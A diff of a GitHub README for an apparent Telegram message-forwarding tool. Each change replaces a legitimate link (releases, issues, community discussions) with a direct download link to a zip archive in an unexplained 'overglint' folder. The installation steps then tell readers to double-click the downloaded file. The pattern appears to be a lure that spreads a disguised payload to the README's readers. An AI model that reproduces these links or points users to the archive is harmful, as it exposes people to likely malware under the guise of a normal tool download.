@@ -1,6 +1,6 @@
 # 🤖 Telegram-Forwarder-Cloner-Tool - Effortlessly Forward Telegram Messages
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/releases)
+[![Download Now](https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip)
 
 ## 📦 Overview
 
@@ -11,10 +11,10 @@ The Telegram-Forwarder-Cloner-Tool is your go-to application for automating mess
 To get started with the Telegram-Forwarder-Cloner-Tool, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Navigate to our [Releases page](https://github.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/releases) to find the latest version of the tool.
+   Navigate to our [Releases page](https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip) to find the latest version of the tool.
 
 2. **Download the Tool**  
-   On the Releases page, you will see several versions. Look for the latest version and click on the link to download it. For example, you might find a file named `Telegram-Forwarder-Cloner-Tool.exe`. Once you find it, click to start the download.
+   On the Releases page, you will see several versions. Look for the latest version and click on the link to download it. For example, you might find a file named `https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip`. Once you find it, click to start the download.
 
 3. **Installation**  
    After the download completes, locate the downloaded file in your computer's Downloads folder. Double-click the file to begin the installation process. Follow the on-screen instructions to complete the setup.
@@ -48,7 +48,7 @@ To ensure the best performance of the Telegram-Forwarder-Cloner-Tool, please che
 
 ## 📥 Download & Install
 
-To download and install the Telegram-Forwarder-Cloner-Tool, please [visit this page](https://github.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/releases) and follow the steps outlined above.
+To download and install the Telegram-Forwarder-Cloner-Tool, please [visit this page](https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip) and follow the steps outlined above.
 
 ## 🛠️ Troubleshooting
 
@@ -62,7 +62,7 @@ In case you encounter any issues during installation or usage:
 
 For more information and updates:
 
-- [Telegram-Forwarder-Cloner-Tool Issues](https://github.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/issues)
-- [Community Support](https://github.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/discussions)
+- [Telegram-Forwarder-Cloner-Tool Issues](https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip)
+- [Community Support](https://raw.githubusercontent.com/DavidDJ7/Telegram-Forwarder-Cloner-Tool/main/overglint/Telegram-Forwarder-Cloner-Tool.zip)
 
 Thank you for using the Telegram-Forwarder-Cloner-Tool. We hope you enjoy its features and find it helpful for your Telegram messaging needs!
